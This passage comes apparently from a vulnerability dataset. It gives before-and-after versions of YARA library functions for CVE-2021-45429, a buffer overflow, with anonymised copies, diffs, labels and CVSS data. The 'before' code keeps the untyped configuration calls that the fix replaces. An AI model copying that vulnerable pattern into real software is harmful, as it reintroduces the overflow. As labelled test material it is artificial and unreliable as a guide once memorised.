 ","{'deleted_lines': ['  yr_get_configuration(', '      YR_CONFIG_MAX_PROCESS_MEMORY_CHUNK, (void*) &max_process_memory_chunk);'], 'added_lines': ['  yr_get_configuration_uint64(', '      YR_CONFIG_MAX_PROCESS_MEMORY_CHUNK, &max_process_memory_chunk);']}",True,"A Buffer Overflow vulnerablity exists in VirusTotal YARA git commit: 605b2edf07ed8eb9a2c61ba22eb2e7c362f47ba7 via yr_set_configuration in yara/libyara/libyara.c, which could cause a Denial of Service.",5.5,MEDIUM,1,valid,2021-12-17T15:47:20Z,4
CVE-2021-45429,['CWE-120'],AV:N/AC:M/Au:N/C:N/I:N/A:P,0,VirusTotal/yara,"Fix issue #1616

This is a more comprehensive fix than #1617, it adds new functions to the API for getting/setting uint32 and uint64 settings.  Using these functions is preferable over calling `yr_(get|set)_configuration` directly.",b34b7e74c862c129b801832b6b85401fbada2b01,https://github.com/VirusTotal/yara/commit/b34b7e74c862c129b801832b6b85401fbada2b01,libyara/compiler.c,yr_compiler_get_error_message,"YR_API char* yr_compiler_get_error_message(
YR_COMPILER* compiler,
char* buffer,
int buffer_size)
{
uint32_t max_strings_per_rule;
switch (compiler->last_error)
{
case ERROR_INSUFFICIENT_MEMORY:
snprintf(buffer, buffer_size, ""not enough memory"");
break;
case ERROR_DUPLICATED_IDENTIFIER:
snprintf(
buffer,
buffer_size,
""duplicated identifier \""%s\"""",
compiler->last_error_extra_info);
break;
case ERROR_DUPLICATED_STRING_IDENTIFIER:
snprintf(
buffer,
buffer_size,
""duplicated string identifier \""%s\"""",
compiler->last_error_extra_info);
break;
case ERROR_DUPLICATED_TAG_IDENTIFIER:
snprintf(
buffer,
buffer_size,
""duplicated tag identifier \""%s\"""",
compiler->last_error_extra_info);
break;
case ERROR_DUPLICATED_META_IDENTIFIER:
snprintf(
buffer,
buffer_size,
""duplicated metadata identifier \""%s\"""",
compiler->last_error_extra_info);
break;
case ERROR_DUPLICATED_LOOP_IDENTIFIER:
snprintf(
buffer,
buffer_size,
""duplicated loop identifier \""%s\"""",
compiler->last_error_extra_info);
break;
case ERROR_UNDEFINED_STRING:
snprintf(
buffer,
buffer_size,
""undefined string \""%s\"""",
compiler->last_error_extra_info);
break;
case ERROR_UNDEFINED_IDENTIFIER:
snprintf(
buffer,
buffer_size,
""undefined identifier \""%s\"""",
compiler->last_error_extra_info);
break;
case ERROR_UNREFERENCED_STRING:
snprintf(
buffer,
buffer_size,
""unreferenced string \""%s\"""",
compiler->last_error_extra_info);
break;
case ERROR_EMPTY_STRING:
snprintf(
buffer,
buffer_size,
""empty string \""%s\"""",
compiler->last_error_extra_info);
break;
case ERROR_NOT_A_STRUCTURE:
snprintf(
buffer,
buffer_size,
""\""%s\"" is not a structure"",
compiler->last_error_extra_info);
break;
case ERROR_NOT_INDEXABLE:
snprintf(
buffer,
buffer_size,
""\""%s\"" is not an array or dictionary"",
compiler->last_error_extra_info);
break;
case ERROR_NOT_A_FUNCTION:
snprintf(
buffer,
buffer_size,
""\""%s\"" is not a function"",
compiler->last_error_extra_info);
break;
case ERROR_INVALID_FIELD_NAME:
snprintf(
buffer,
buffer_size,
""invalid field name \""%s\"""",
compiler->last_error_extra_info);
break;
case ERROR_MISPLACED_ANONYMOUS_STRING:
snprintf(buffer, buffer_size, ""wrong use of anonymous string"");
break;
case ERROR_INCLUDES_CIRCULAR_REFERENCE:
snprintf(buffer, buffer_size, ""include circular reference"");
break;
case ERROR_INCLUDE_DEPTH_EXCEEDED:
snprintf(buffer, buffer_size, ""too many levels of included rules"");
break;
case ERROR_LOOP_NESTING_LIMIT_EXCEEDED:
snprintf(buffer, buffer_size, ""loop nesting limit exceeded"");
break;
case ERROR_NESTED_FOR_OF_LOOP:
snprintf(
buffer,
buffer_size,
""'for <quantifier> of <string set>' loops can't be nested"");
break;
case ERROR_UNKNOWN_MODULE:
snprintf(
buffer,
buffer_size,
""unknown module \""%s\"""",
compiler->last_error_extra_info);
break;
case ERROR_INVALID_MODULE_NAME:
snprintf(
buffer,
buffer_size,
""invalid module name \""%s\"""",
compiler->last_error_extra_info);
break;
case ERROR_DUPLICATED_STRUCTURE_MEMBER:
snprintf(buffer, buffer_size, ""duplicated structure member"");
break;
case ERROR_WRONG_ARGUMENTS:
snprintf(
buffer,
buffer_size,
""wrong arguments for function \""%s\"""",
compiler->last_error_extra_info);
break;
case ERROR_WRONG_RETURN_TYPE:
snprintf(buffer, buffer_size, ""wrong return type for overloaded function"");
break;
case ERROR_INVALID_HEX_STRING:
case ERROR_INVALID_REGULAR_EXPRESSION:
case ERROR_SYNTAX_ERROR:
case ERROR_WRONG_TYPE:
case ERROR_INVALID_MODIFIER:
case ERROR_INVALID_PERCENTAGE:
snprintf(buffer, buffer_size, ""%s"", compiler->last_error_extra_info);
break;
case ERROR_INTERNAL_FATAL_ERROR:
snprintf(buffer, buffer_size, ""internal fatal error"");
break;
case ERROR_DIVISION_BY_ZERO:
snprintf(buffer, buffer_size, ""division by zero"");
break;
case ERROR_REGULAR_EXPRESSION_TOO_LARGE:
snprintf(buffer, buffer_size, ""regular expression is too large"");
break;
case ERROR_REGULAR_EXPRESSION_TOO_COMPLEX:
snprintf(buffer, buffer_size, ""regular expression is too complex"");
break;
case ERROR_TOO_MANY_STRINGS:
yr_get_configuration(YR_CONFIG_MAX_STRINGS_PER_RULE, &max_strings_per_rule);
snprintf(
buffer,
buffer_size,
""too many strings in rule \""%s\"" (limit: %d)"",
compiler->last_error_extra_info,
max_strings_per_rule);
break;
case ERROR_INTEGER_OVERFLOW:
snprintf(
buffer,
buffer_size,
""integer overflow in \""%s\"""",
compiler->last_error_extra_info);
break;
case ERROR_COULD_NOT_READ_FILE:
snprintf(buffer, buffer_size, ""could not read file"");
break;
case ERROR_DUPLICATED_MODIFIER:
snprintf(buffer, buffer_size, ""duplicated modifier"");
break;
}
return buffer;
}","YR_API VAR_0* yr_compiler_get_error_message(
YR_COMPILER* VAR_1,
char* VAR_2,
int VAR_3)
{
uint32_t VAR_4;
switch (VAR_1->last_error)
{
case VAR_5:
snprintf(VAR_2, VAR_3, ""not enough memory"");
break;
case VAR_6:
snprintf(
VAR_2,
VAR_3,
""duplicated identifier \""%s\"""",
VAR_1->last_error_extra_info);
break;
case VAR_7:
snprintf(
VAR_2,
VAR_3,
""duplicated string identifier \""%s\"""",
VAR_1->last_error_extra_info);
break;
case VAR_8:
snprintf(
VAR_2,
VAR_3,
""duplicated tag identifier \""%s\"""",
VAR_1->last_error_extra_info);
break;
case VAR_9:
snprintf(
VAR_2,
VAR_3,
""duplicated metadata identifier \""%s\"""",
VAR_1->last_error_extra_info);
break;
case VAR_10:
snprintf(
VAR_2,
VAR_3,
""duplicated loop identifier \""%s\"""",
VAR_1->last_error_extra_info);
break;
case VAR_11:
snprintf(
VAR_2,
VAR_3,
""undefined string \""%s\"""",
VAR_1->last_error_extra_info);
break;
case VAR_12:
snprintf(
VAR_2,
VAR_3,
""undefined identifier \""%s\"""",
VAR_1->last_error_extra_info);
break;
case VAR_13:
snprintf(
VAR_2,
VAR_3,
""unreferenced string \""%s\"""",
VAR_1->last_error_extra_info);
break;
case VAR_14:
snprintf(
VAR_2,
VAR_3,
""empty string \""%s\"""",
VAR_1->last_error_extra_info);
break;
case VAR_15:
snprintf(
VAR_2,
VAR_3,
""\""%s\"" is not a structure"",
VAR_1->last_error_extra_info);
break;
case VAR_16:
snprintf(
VAR_2,
VAR_3,
""\""%s\"" is not an array or dictionary"",
VAR_1->last_error_extra_info);
break;
case VAR_17:
snprintf(
VAR_2,
VAR_3,
""\""%s\"" is not a function"",
VAR_1->last_error_extra_info);
break;
case VAR_18:
snprintf(
VAR_2,
VAR_3,
""invalid field name \""%s\"""",
VAR_1->last_error_extra_info);
break;
case VAR_19:
snprintf(VAR_2, VAR_3, ""wrong use of anonymous string"");
break;
case VAR_20:
snprintf(VAR_2, VAR_3, ""include circular reference"");
break;
case VAR_21:
snprintf(VAR_2, VAR_3, ""too many levels of included rules"");
break;
case VAR_22:
snprintf(VAR_2, VAR_3, ""loop nesting limit exceeded"");
break;
case VAR_23:
snprintf(
VAR_2,
VAR_3,
""'for <quantifier> of <string set>' loops can't be nested"");
break;
case VAR_24:
snprintf(
VAR_2,
VAR_3,
""unknown module \""%s\"""",
VAR_1->last_error_extra_info);
break;
case VAR_25:
snprintf(
VAR_2,
VAR_3,
""invalid module name \""%s\"""",
VAR_1->last_error_extra_info);
break;
case VAR_26:
snprintf(VAR_2, VAR_3, ""duplicated structure member"");
break;
case VAR_27:
snprintf(
VAR_2,
VAR_3,
""wrong arguments for function \""%s\"""",
VAR_1->last_error_extra_info);
break;
case VAR_28:
snprintf(VAR_2, VAR_3, ""wrong return type for overloaded function"");
break;
case VAR_29:
case VAR_30:
case VAR_31:
case VAR_32:
case VAR_33:
case VAR_34:
snprintf(VAR_2, VAR_3, ""%s"", VAR_1->last_error_extra_info);
break;
case VAR_35:
snprintf(VAR_2, VAR_3, ""internal fatal error"");
break;
case VAR_36:
snprintf(VAR_2, VAR_3, ""division by zero"");
break;
case VAR_37:
snprintf(VAR_2, VAR_3, ""regular expression is too large"");
break;
case VAR_38:
snprintf(VAR_2, VAR_3, ""regular expression is too complex"");
break;
case VAR_39:
yr_get_configuration(VAR_40, &VAR_4);
snprintf(
VAR_2,
VAR_3,
""too many strings in rule \""%s\"" (limit: %d)"",
VAR_1->last_error_extra_info,
VAR_4);
break;
case VAR_41:
snprintf(
VAR_2,
VAR_3,
""integer overflow in \""%s\"""",
VAR_1->last_error_extra_info);
break;
case VAR_42:
snprintf(VAR_2, VAR_3, ""could not read file"");
break;
case VAR_43:
snprintf(VAR_2, VAR_3, ""duplicated modifier"");
break;
}
return VAR_2;
}",,"YR_API char* yr_compiler_get_error_message(
    YR_COMPILER* compiler,
    char* buffer,
    int buffer_size)
{
  uint32_t max_strings_per_rule;

  switch (compiler->last_error)
  {
  case ERROR_INSUFFICIENT_MEMORY:
    snprintf(buffer, buffer_size, ""not enough memory"");
    break;
  case ERROR_DUPLICATED_IDENTIFIER:
    snprintf(
        buffer,
        buffer_size,
        ""duplicated identifier \""%s\"""",
        compiler->last_error_extra_info);
    break;
  case ERROR_DUPLICATED_STRING_IDENTIFIER:
    snprintf(
        buffer,
        buffer_size,
        ""duplicated string identifier \""%s\"""",
        compiler->last_error_extra_info);
    break;
  case ERROR_DUPLICATED_TAG_IDENTIFIER:
    snprintf(
        buffer,
        buffer_size,
        ""duplicated tag identifier \""%s\"""",
        compiler->last_error_extra_info);
    break;
  case ERROR_DUPLICATED_META_IDENTIFIER:
    snprintf(
        buffer,
        buffer_size,
        ""duplicated metadata identifier \""%s\"""",
        compiler->last_error_extra_info);
    break;
  case ERROR_DUPLICATED_LOOP_IDENTIFIER:
    snprintf(
        buffer,
        buffer_size,
        ""duplicated loop identifier \""%s\"""",
        compiler->last_error_extra_info);
    break;
  case ERROR_UNDEFINED_STRING:
    snprintf(
        buffer,
        buffer_size,
        ""undefined string \""%s\"""",
        compiler->last_error_extra_info);
    break;
  case ERROR_UNDEFINED_IDENTIFIER:
    snprintf(
        buffer,
        buffer_size,
        ""undefined identifier \""%s\"""",
        compiler->last_error_extra_info);
    break;
  case ERROR_UNREFERENCED_STRING:
    snprintf(
        buffer,
        buffer_size,
        ""unreferenced string \""%s\"""",
        compiler->last_error_extra_info);
    break;
  case ERROR_EMPTY_STRING:
    snprintf(
        buffer,
        buffer_size,
        ""empty string \""%s\"""",
        compiler->last_error_extra_info);
    break;
  case ERROR_NOT_A_STRUCTURE:
    snprintf(
        buffer,
        buffer_size,
        ""\""%s\"" is not a structure"",
        compiler->last_error_extra_info);
    break;
  case ERROR_NOT_INDEXABLE:
    snprintf(
        buffer,
        buffer_size,
        ""\""%s\"" is not an array or dictionary"",
        compiler->last_error_extra_info);
    break;
  case ERROR_NOT_A_FUNCTION:
    snprintf(
        buffer,
        buffer_size,
        ""\""%s\"" is not a function"",
        compiler->last_error_extra_info);
    break;
  case ERROR_INVALID_FIELD_NAME:
    snprintf(
        buffer,
        buffer_size,
        ""invalid field name \""%s\"""",
        compiler->last_error_extra_info);
    break;
  case ERROR_MISPLACED_ANONYMOUS_STRING:
    snprintf(buffer, buffer_size, ""wrong use of anonymous string"");
    break;
  case ERROR_INCLUDES_CIRCULAR_REFERENCE:
    snprintf(buffer, buffer_size, ""include circular reference"");
    break;
  case ERROR_INCLUDE_DEPTH_EXCEEDED:
    snprintf(buffer, buffer_size, ""too many levels of included rules"");
    break;
  case ERROR_LOOP_NESTING_LIMIT_EXCEEDED:
    snprintf(buffer, buffer_size, ""loop nesting limit exceeded"");
    break;
  case ERROR_NESTED_FOR_OF_LOOP:
    snprintf(
        buffer,
        buffer_size,
        ""'for <quantifier> of <string set>' loops can't be nested"");
    break;
  case ERROR_UNKNOWN_MODULE:
    snprintf(
        buffer,
        buffer_size,
        ""unknown module \""%s\"""",
        compiler->last_error_extra_info);
    break;
  case ERROR_INVALID_MODULE_NAME:
    snprintf(
        buffer,
        buffer_size,
        ""invalid module name \""%s\"""",
        compiler->last_error_extra_info);
    break;
  case ERROR_DUPLICATED_STRUCTURE_MEMBER:
    snprintf(buffer, buffer_size, ""duplicated structure member"");
    break;
  case ERROR_WRONG_ARGUMENTS:
    snprintf(
        buffer,
        buffer_size,
        ""wrong arguments for function \""%s\"""",
        compiler->last_error_extra_info);
    break;
  case ERROR_WRONG_RETURN_TYPE:
    snprintf(buffer, buffer_size, ""wrong return type for overloaded function"");
    break;
  case ERROR_INVALID_HEX_STRING:
  case ERROR_INVALID_REGULAR_EXPRESSION:
  case ERROR_SYNTAX_ERROR:
  case ERROR_WRONG_TYPE:
  case ERROR_INVALID_MODIFIER:
  case ERROR_INVALID_PERCENTAGE:
    snprintf(buffer, buffer_size, ""%s"", compiler->last_error_extra_info);
    break;
  case ERROR_INTERNAL_FATAL_ERROR:
    snprintf(buffer, buffer_size, ""internal fatal error"");
    break;
  case ERROR_DIVISION_BY_ZERO:
    snprintf(buffer, buffer_size, ""division by zero"");
    break;
  case ERROR_REGULAR_EXPRESSION_TOO_LARGE:
    snprintf(buffer, buffer_size, ""regular expression is too large"");
    break;
  case ERROR_REGULAR_EXPRESSION_TOO_COMPLEX:
    snprintf(buffer, buffer_size, ""regular expression is too complex"");
    break;
  case ERROR_TOO_MANY_STRINGS:
    yr_get_configuration_uint32(
        YR_CONFIG_MAX_STRINGS_PER_RULE, &max_strings_per_rule);
    snprintf(
        buffer,
        buffer_size,
        ""too many strings in rule \""%s\"" (limit: %d)"",
        compiler->last_error_extra_info,
        max_strings_per_rule);
    break;
  case ERROR_INTEGER_OVERFLOW:
    snprintf(
        buffer,
        buffer_size,
        ""integer overflow in \""%s\"""",
        compiler->last_error_extra_info);
    break;
  case ERROR_COULD_NOT_READ_FILE:
    snprintf(buffer, buffer_size, ""could not read file"");
    break;
  case ERROR_DUPLICATED_MODIFIER:
    snprintf(buffer, buffer_size, ""duplicated modifier"");
    break;
  }

  return buffer;
}","YR_API VAR_0* yr_compiler_get_error_message(
    YR_COMPILER* VAR_1,
    char* VAR_2,
    int VAR_3)
{
  uint32_t VAR_4;

  switch (VAR_1->last_error)
  {
  case VAR_5:
    snprintf(VAR_2, VAR_3, ""not enough memory"");
    break;
  case VAR_6:
    snprintf(
        VAR_2,
        VAR_3,
        ""duplicated identifier \""%s\"""",
        VAR_1->last_error_extra_info);
    break;
  case VAR_7:
    snprintf(
        VAR_2,
        VAR_3,
        ""duplicated string identifier \""%s\"""",
        VAR_1->last_error_extra_info);
    break;
  case VAR_8:
    snprintf(
        VAR_2,
        VAR_3,
        ""duplicated tag identifier \""%s\"""",
        VAR_1->last_error_extra_info);
    break;
  case VAR_9:
    snprintf(
        VAR_2,
        VAR_3,
        ""duplicated metadata identifier \""%s\"""",
        VAR_1->last_error_extra_info);
    break;
  case VAR_10:
    snprintf(
        VAR_2,
        VAR_3,
        ""duplicated loop identifier \""%s\"""",
        VAR_1->last_error_extra_info);
    break;
  case VAR_11:
    snprintf(
        VAR_2,
        VAR_3,
        ""undefined string \""%s\"""",
        VAR_1->last_error_extra_info);
    break;
  case VAR_12:
    snprintf(
        VAR_2,
        VAR_3,
        ""undefined identifier \""%s\"""",
        VAR_1->last_error_extra_info);
    break;
  case VAR_13:
    snprintf(
        VAR_2,
        VAR_3,
        ""unreferenced string \""%s\"""",
        VAR_1->last_error_extra_info);
    break;
  case VAR_14:
    snprintf(
        VAR_2,
        VAR_3,
        ""empty string \""%s\"""",
        VAR_1->last_error_extra_info);
    break;
  case VAR_15:
    snprintf(
        VAR_2,
        VAR_3,
        ""\""%s\"" is not a structure"",
        VAR_1->last_error_extra_info);
    break;
  case VAR_16:
    snprintf(
        VAR_2,
        VAR_3,
        ""\""%s\"" is not an array or dictionary"",
        VAR_1->last_error_extra_info);
    break;
  case VAR_17:
    snprintf(
        VAR_2,
        VAR_3,
        ""\""%s\"" is not a function"",
        VAR_1->last_error_extra_info);
    break;
  case VAR_18:
    snprintf(
        VAR_2,
        VAR_3,
        ""invalid field name \""%s\"""",
        VAR_1->last_error_extra_info);
    break;
  case VAR_19:
    snprintf(VAR_2, VAR_3, ""wrong use of anonymous string"");
    break;
  case VAR_20:
    snprintf(VAR_2, VAR_3, ""include circular reference"");
    break;
  case VAR_21:
    snprintf(VAR_2, VAR_3, ""too many levels of included rules"");
    break;
  case VAR_22:
    snprintf(VAR_2, VAR_3, ""loop nesting limit exceeded"");
    break;
  case VAR_23:
    snprintf(
        VAR_2,
        VAR_3,
        ""'for <quantifier> of <string set>' loops can't be nested"");
    break;
  case VAR_24:
    snprintf(
        VAR_2,
        VAR_3,
        ""unknown module \""%s\"""",
        VAR_1->last_error_extra_info);
    break;
  case VAR_25:
    snprintf(
        VAR_2,
        VAR_3,
        ""invalid module name \""%s\"""",
        VAR_1->last_error_extra_info);
    break;
  case VAR_26:
    snprintf(VAR_2, VAR_3, ""duplicated structure member"");
    break;
  case VAR_27:
    snprintf(
        VAR_2,
        VAR_3,
        ""wrong arguments for function \""%s\"""",
        VAR_1->last_error_extra_info);
    break;
  case VAR_28:
    snprintf(VAR_2, VAR_3, ""wrong return type for overloaded function"");
    break;
  case VAR_29:
  case VAR_30:
  case VAR_31:
  case VAR_32:
  case VAR_33:
  case VAR_34:
    snprintf(VAR_2, VAR_3, ""%s"", VAR_1->last_error_extra_info);
    break;
  case VAR_35:
    snprintf(VAR_2, VAR_3, ""internal fatal error"");
    break;
  case VAR_36:
    snprintf(VAR_2, VAR_3, ""division by zero"");
    break;
  case VAR_37:
    snprintf(VAR_2, VAR_3, ""regular expression is too large"");
    break;
  case VAR_38:
    snprintf(VAR_2, VAR_3, ""regular expression is too complex"");
    break;
  case VAR_39:
    yr_get_configuration_uint32(
        VAR_40, &VAR_4);
    snprintf(
        VAR_2,
        VAR_3,
        ""too many strings in rule \""%s\"" (limit: %d)"",
        VAR_1->last_error_extra_info,
        VAR_4);
    break;
  case VAR_41:
    snprintf(
        VAR_2,
        VAR_3,
        ""integer overflow in \""%s\"""",
        VAR_1->last_error_extra_info);
    break;
  case VAR_42:
    snprintf(VAR_2, VAR_3, ""could not read file"");
    break;
  case VAR_43:
    snprintf(VAR_2, VAR_3, ""duplicated modifier"");
    break;
  }

  return VAR_2;
}",,"--- func_before
+++ func_after
@@ -167,7 +167,8 @@
     snprintf(buffer, buffer_size, ""regular expression is too complex"");
     break;
   case ERROR_TOO_MANY_STRINGS:
-    yr_get_configuration(YR_CONFIG_MAX_STRINGS_PER_RULE, &max_strings_per_rule);
+    yr_get_configuration_uint32(
+        YR_CONFIG_MAX_STRINGS_PER_RULE, &max_strings_per_rule);
     snprintf(
         buffer,
         buffer_size,","{'deleted_lines': ['    yr_get_configuration(YR_CONFIG_MAX_STRINGS_PER_RULE, &max_strings_per_rule);'], 'added_lines': ['    yr_get_configuration_uint32(', '        YR_CONFIG_MAX_STRINGS_PER_RULE, &max_strings_per_rule);']}",True,"A Buffer Overflow vulnerablity exists in VirusTotal YARA git commit: 605b2edf07ed8eb9a2c61ba22eb2e7c362f47ba7 via yr_set_configuration in yara/libyara/libyara.c, which could cause a Denial of Service.",5.5,MEDIUM,1,valid,2021-12-17T15:47:20Z,4
CVE-2021-45429,['CWE-120'],AV:N/AC:M/Au:N/C:N/I:N/A:P,0,VirusTotal/yara,"Fix issue #1616

This is a more comprehensive fix than #1617, it adds new functions to the API for getting/setting uint32 and uint64 settings.  Using these functions is preferable over calling `yr_(get|set)_configuration` directly.",b34b7e74c862c129b801832b6b85401fbada2b01,https://github.com/VirusTotal/yara/commit/b34b7e74c862c129b801832b6b85401fbada2b01,libyara/parser.c,yr_parser_reduce_rule_declaration_phase_2,"int yr_parser_reduce_rule_declaration_phase_2(
yyscan_t yyscanner,
YR_ARENA_REF* rule_ref)
{
uint32_t max_strings_per_rule;
uint32_t strings_in_rule = 0;
YR_FIXUP* fixup;
YR_STRING* string;
YR_COMPILER* compiler = yyget_extra(yyscanner);
yr_get_configuration(
YR_CONFIG_MAX_STRINGS_PER_RULE, (void*) &max_strings_per_rule);
YR_RULE* rule = (YR_RULE*) yr_arena_ref_to_ptr(compiler->arena, rule_ref);
if (rule->num_atoms > YR_ATOMS_PER_RULE_WARNING_THRESHOLD)
{
yywarning(yyscanner, ""rule is slowing down scanning"");
}
yr_rule_strings_foreach(rule, string)
{
if (!STRING_IS_REFERENCED(string) && string->chained_to == NULL)
{
yr_compiler_set_error_extra_info(
compiler, string->identifier) return ERROR_UNREFERENCED_STRING;
}
strings_in_rule++;
if (strings_in_rule > max_strings_per_rule)
{
yr_compiler_set_error_extra_info(
compiler, rule->identifier) return ERROR_TOO_MANY_STRINGS;
}
}
FAIL_ON_ERROR(yr_parser_emit_with_arg(
yyscanner, OP_MATCH_RULE, compiler->current_rule_idx, NULL, NULL));
fixup = compiler->fixup_stack_head;
int32_t* jmp_offset_addr = (int32_t*) yr_arena_ref_to_ptr(
compiler->arena, &fixup->ref);
int32_t jmp_offset = yr_arena_get_current_offset(
compiler->arena, YR_CODE_SECTION) -
fixup->ref.offset + 1;
*jmp_offset_addr = jmp_offset;
compiler->fixup_stack_head = fixup->next;
yr_free(fixup);
compiler->current_rule_idx = UINT32_MAX;
return ERROR_SUCCESS;
}","int yr_parser_reduce_rule_declaration_phase_2(
yyscan_t VAR_0,
YR_ARENA_REF* VAR_1)
{
uint32_t VAR_2;
uint32_t VAR_3 = 0;
YR_FIXUP* VAR_4;
YR_STRING* VAR_5;
YR_COMPILER* VAR_6 = yyget_extra(VAR_0);
yr_get_configuration(
VAR_7, (void*) &VAR_2);
YR_RULE* VAR_8 = (YR_RULE*) yr_arena_ref_to_ptr(VAR_6->arena, VAR_1);
if (VAR_8->num_atoms > VAR_9)
{
yywarning(VAR_0, ""rule is slowing down scanning"");
}
yr_rule_strings_foreach(VAR_8, VAR_5)
{
if (!STRING_IS_REFERENCED(VAR_5) && VAR_5->chained_to == NULL)
{
yr_compiler_set_error_extra_info(
VAR_6, VAR_5->identifier) return VAR_10;
}
VAR_3++;
if (VAR_3 > VAR_2)
{
yr_compiler_set_error_extra_info(
VAR_6, VAR_8->identifier) return VAR_11;
}
}
FAIL_ON_ERROR(yr_parser_emit_with_arg(
VAR_0, VAR_12, VAR_6->current_rule_idx, NULL, NULL));
VAR_4 = VAR_6->fixup_stack_head;
int32_t* VAR_13 = (int32_t*) yr_arena_ref_to_ptr(
VAR_6->arena, &VAR_4->ref);
int32_t VAR_14 = yr_arena_get_current_offset(
VAR_6->arena, VAR_15) -
VAR_4->ref.offset + 1;
*VAR_13 = VAR_14;
VAR_6->fixup_stack_head = VAR_4->next;
yr_free(VAR_4);
VAR_6->current_rule_idx = VAR_16;
return VAR_17;
}",VirusTotal/yara/b34b7e74c862c129b801832b6b85401fbada2b01/parser.c/vul/before/0.json,"int yr_parser_reduce_rule_declaration_phase_2(
    yyscan_t yyscanner,
    YR_ARENA_REF* rule_ref)
{
  uint32_t max_strings_per_rule;
  uint32_t strings_in_rule = 0;

  YR_FIXUP* fixup;
  YR_STRING* string;
  YR_COMPILER* compiler = yyget_extra(yyscanner);

  yr_get_configuration_uint32(
      YR_CONFIG_MAX_STRINGS_PER_RULE, &max_strings_per_rule);

  YR_RULE* rule = (YR_RULE*) yr_arena_ref_to_ptr(compiler->arena, rule_ref);

  // Show warning if the rule is generating too many atoms. The warning is
  // shown if the number of atoms is greater than 20 times the maximum number
  // of strings allowed for a rule, as 20 is minimum number of atoms generated
  // for a string using *nocase*, *ascii* and *wide* modifiers simultaneously.

  if (rule->num_atoms > YR_ATOMS_PER_RULE_WARNING_THRESHOLD)
  {
    yywarning(yyscanner, ""rule is slowing down scanning"");
  }

  yr_rule_strings_foreach(rule, string)
  {
    // Only the heading fragment in a chain of strings (the one with
    // chained_to == NULL) must be referenced. All other fragments
    // are never marked as referenced.

    if (!STRING_IS_REFERENCED(string) && string->chained_to == NULL)
    {
      yr_compiler_set_error_extra_info(
          compiler, string->identifier) return ERROR_UNREFERENCED_STRING;
    }

    strings_in_rule++;

    if (strings_in_rule > max_strings_per_rule)
    {
      yr_compiler_set_error_extra_info(
          compiler, rule->identifier) return ERROR_TOO_MANY_STRINGS;
    }
  }

  FAIL_ON_ERROR(yr_parser_emit_with_arg(
      yyscanner, OP_MATCH_RULE, compiler->current_rule_idx, NULL, NULL));

  fixup = compiler->fixup_stack_head;

  int32_t* jmp_offset_addr = (int32_t*) yr_arena_ref_to_ptr(
      compiler->arena, &fixup->ref);

  int32_t jmp_offset = yr_arena_get_current_offset(
                           compiler->arena, YR_CODE_SECTION) -
                       fixup->ref.offset + 1;

  *jmp_offset_addr = jmp_offset;

  // Remove fixup from the stack.
  compiler->fixup_stack_head = fixup->next;
  yr_free(fixup);

  // We have finished parsing the current rule set current_rule_idx to
  // UINT32_MAX indicating that we are not currently parsing a rule.
  compiler->current_rule_idx = UINT32_MAX;

  return ERROR_SUCCESS;
}","int yr_parser_reduce_rule_declaration_phase_2(
    yyscan_t VAR_0,
    YR_ARENA_REF* VAR_1)
{
  uint32_t VAR_2;
  uint32_t VAR_3 = 0;

  YR_FIXUP* VAR_4;
  YR_STRING* VAR_5;
  YR_COMPILER* VAR_6 = yyget_extra(VAR_0);

  yr_get_configuration_uint32(
      VAR_7, &VAR_2);

  YR_RULE* VAR_8 = (YR_RULE*) yr_arena_ref_to_ptr(VAR_6->arena, VAR_1);

  /* COMMENT_0 */
  /* COMMENT_1 */
  /* COMMENT_2 */
  /* COMMENT_3 */

  if (VAR_8->num_atoms > VAR_9)
  {
    yywarning(VAR_0, ""rule is slowing down scanning"");
  }

  yr_rule_strings_foreach(VAR_8, VAR_5)
  {
    /* COMMENT_4 */
    /* COMMENT_5 */
    /* COMMENT_6 */

    if (!STRING_IS_REFERENCED(VAR_5) && VAR_5->chained_to == NULL)
    {
      yr_compiler_set_error_extra_info(
          VAR_6, VAR_5->identifier) return VAR_10;
    }

    VAR_3++;

    if (VAR_3 > VAR_2)
    {
      yr_compiler_set_error_extra_info(
          VAR_6, VAR_8->identifier) return VAR_11;
    }
  }

  FAIL_ON_ERROR(yr_parser_emit_with_arg(
      VAR_0, VAR_12, VAR_6->current_rule_idx, NULL, NULL));

  VAR_4 = VAR_6->fixup_stack_head;

  int32_t* VAR_13 = (int32_t*) yr_arena_ref_to_ptr(
      VAR_6->arena, &VAR_4->ref);

  int32_t VAR_14 = yr_arena_get_current_offset(
                           VAR_6->arena, VAR_15) -
                       VAR_4->ref.offset + 1;

  *VAR_13 = VAR_14;

  /* COMMENT_7 */
  VAR_6->fixup_stack_head = VAR_4->next;
  yr_free(VAR_4);

  /* COMMENT_8 */
  /* COMMENT_9 */
  VAR_6->current_rule_idx = VAR_16;

  return VAR_17;
}",VirusTotal/yara/b34b7e74c862c129b801832b6b85401fbada2b01/parser.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -9,8 +9,8 @@
   YR_STRING* string;
   YR_COMPILER* compiler = yyget_extra(yyscanner);
 
-  yr_get_configuration(
-      YR_CONFIG_MAX_STRINGS_PER_RULE, (void*) &max_strings_per_rule);
+  yr_get_configuration_uint32(
+      YR_CONFIG_MAX_STRINGS_PER_RULE, &max_strings_per_rule);
 
   YR_RULE* rule = (YR_RULE*) yr_arena_ref_to_ptr(compiler->arena, rule_ref);
 ","{'deleted_lines': ['  yr_get_configuration(', '      YR_CONFIG_MAX_STRINGS_PER_RULE, (void*) &max_strings_per_rule);'], 'added_lines': ['  yr_get_configuration_uint32(', '      YR_CONFIG_MAX_STRINGS_PER_RULE, &max_strings_per_rule);']}",True,"A Buffer Overflow vulnerablity exists in VirusTotal YARA git commit: 605b2edf07ed8eb9a2c61ba22eb2e7c362f47ba7 via yr_set_configuration in yara/libyara/libyara.c, which could cause a Denial of Service.",5.5,MEDIUM,1,valid,2021-12-17T15:47:20Z,4
CVE-2021-45429,['CWE-120'],AV:N/AC:M/Au:N/C:N/I:N/A:P,0,VirusTotal/yara,"Fix issue #1616

This is a more comprehensive fix than #1617, it adds new functions to the API for getting/setting uint32 and uint64 settings.  Using these functions is preferable over calling `yr_(get|set)_configuration` directly.",b34b7e74c862c129b801832b6b85401fbada2b01,https://github.com/VirusTotal/yara/commit/b34b7e74c862c129b801832b6b85401fbada2b01,libyara/scan.c,_yr_scan_verify_chained_string_match,"static int _yr_scan_verify_chained_string_match(
YR_STRING* matching_string,
YR_SCAN_CONTEXT* context,
const uint8_t* match_data,
uint64_t match_base,
uint64_t match_offset,
int32_t match_length)
{
YR_DEBUG_FPRINTF(
2,
stderr,
""- %s (match_data=%p match_base=%"" PRIx64 "" match_offset=0x%"" PRIx64
"" match_length=%'d) {} \n"",
__FUNCTION__,
